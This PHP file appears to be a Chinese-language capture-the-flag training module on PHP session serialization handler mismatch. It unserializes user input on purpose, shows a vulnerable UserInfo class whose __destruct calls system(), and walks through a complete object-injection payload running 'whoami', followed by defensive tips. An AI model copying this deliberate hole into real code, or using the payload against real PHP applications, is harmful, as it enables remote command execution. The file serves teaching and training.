<?php
$module_name = 'Session序列化机制缺陷';
$module_icon = '💾';
$module_desc = '利用Session处理器差异，通过php_serialize与php处理器混用注入恶意对象。';

$flag = getenv('FLAG') ?: 'flag{deserialization_success}';

class UserInfo {
    public $name;
    public $role;
    public $cmd;

    public function __destruct() {
        if ($this->role === 'admin') {
            echo "<div>__destruct() 被触发！执行命令: " . htmlspecialchars($this->cmd) . "</div>";
            if (preg_match('/(whoami|id|ls|cat|pwd|uname)/i', $this->cmd)) {
                echo "<div>命令执行成功（模拟输出）</div>";
            }
        }
    }
}

$challenge_result = '';
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>📥 输入数据</h6></div><div class="card-body"><pre class="bg-dark text-light p-3 rounded">' . htmlspecialchars($data) . '</pre></div></div>';

    $serialized = serialize(['user' => $data]);
    $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>🔄 php_serialize序列化结果</h6></div><div class="card-body"><p>' . htmlspecialchars($serialized) . '</p></div></div>';

    $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>🔍 php处理器解析</h6></div><div class="card-body">';

    if (strpos($data, '|') !== false) {
        $parts = explode('|', $data, 2);
        $challenge_result .= '<p>变量名: ' . htmlspecialchars($parts[0]) . '</p>';
        $challenge_result .= '<p>序列化数据: ' . htmlspecialchars($parts[1]) . '</p>';

        $unserialized = @unserialize($parts[1]);
        if ($unserialized !== false) {
            $challenge_result .= '<p class="text-success">反序列化成功！</p>';
            $challenge_result .= '<pre class="bg-dark text-light p-3 rounded">' . htmlspecialchars(print_r($unserialized, true)) . '</pre>';

            if (is_object($unserialized)) {
                $challenge_result .= '<div class="alert alert-success"><h5>🎉 恭喜你，挑战成功！</h5><p>你成功注入了一个对象到Session中！</p><strong>🚩 Flag：</strong>' . htmlspecialchars($flag) . '</div>';
            }
        } else {
            $challenge_result .= '<p class="text-danger">反序列化失败</p>';
        }
    } else {
        $challenge_result .= '<p>普通数据，未触发Session注入</p>';
        $challenge_result .= '<div class="alert alert-warning"><h6>挑战失败</h6><p>需要包含 | 符号来注入Session变量</p></div>';
    }
    $challenge_result .= '</div></div>';
}

$content = <<<'EOT'
<div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 漏洞原理</h5></div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>Session序列化机制</strong><br>
                    PHP Session默认使用 <code>php</code> 序列化处理器，但也可以配置为 <code>php_serialize</code>、<code>php_binary</code> 或 <code>igbinary</code>。
                </div>
                <div class="alert alert-danger">
                    <strong>漏洞产生原因</strong><br>
                    当不同组件使用<strong>不同的Session序列化处理器</strong>时，攻击者可以注入恶意Session数据，导致反序列化漏洞。
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💻 漏洞代码</h5></div>
            <div class="card-body">
                <pre class="bg-dark text-light p-3 rounded"><code>// 设置Session序列化处理器（模拟配置差异）
ini_set('session.serialize_handler', 'php_serialize');

class UserInfo {
    public $name;
    public $role;
    public $cmd;

    public function __destruct() {
        if ($this->role === 'admin') {
            system($this->cmd);
        }
    }
}

// 存储Session（使用php_serialize处理器）
if (isset($_POST['data'])) {
    $_SESSION['user'] = $_POST['data'];
}

// === 攻击原理 ===
// php_serialize存储格式: a:1:{s:4:"user";s:5:"admin";}
// php存储格式: user|s:5:"admin";
//
// 当php_serialize写入的数据被php处理器读取时：
// 输入: test|O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:3:"cmd";s:6:"whoami";}
// php处理器按 | 分割：变量名=test, 值=O:8:"UserInfo":3:{...}
// 结果：反序列化注入的对象</code></pre>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">🎯 尝试挑战</h5></div>
            <div class="card-body">
                <form method="GET">
                    <div class="mb-3">
                        <label class="form-label">Session数据（模拟注入）：</label>
                        <input type="text" name="data" class="form-control" placeholder="输入Session数据">
                    </div>
                    <button type="submit" class="btn btn-primary">提交</button>
                </form>
                <?php echo $challenge_result; ?>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 解题提示</h5></div>
            <div class="card-body">
                <h6>第一步：构造恶意对象</h6>
                <pre class="bg-dark text-light p-3 rounded"><code>class UserInfo {
    public $name = "admin";
    public $role = "admin";
    public $cmd = "whoami";
}
$obj = new UserInfo();
$payload = serialize($obj);
echo $payload;
// 输出: O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:3:"cmd";s:6:"whoami";}</code></pre>

                <h6>第二步：注入Session</h6>
                <pre class="bg-dark text-light p-3 rounded"><code>// 在序列化数据前加上 | 分隔符
// php处理器会将 | 前的部分作为变量名，后面的部分作为序列化数据
$data = "test|" . $payload;
// 最终输入: test|O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:3:"cmd";s:6:"whoami";}</code></pre>

                <h6>触发条件</h6>
                <p>当Session被读取时（如刷新页面），php处理器会反序列化注入的对象，触发 <code>__destruct()</code> 执行命令</p>
            </div>
        </div>

        <div class="card">
            <div class="card-header"><h5 class="mb-0">🛡️ 防御措施</h5></div>
            <div class="card-body">
                <ul>
                    <li>统一使用相同的Session序列化处理器</li>
                    <li>不要在运行时修改 <code>session.serialize_handler</code></li>
                    <li>验证Session数据的完整性和类型</li>
                </ul>
            </div>
        </div>
EOT;

include '../template/module_template.php';
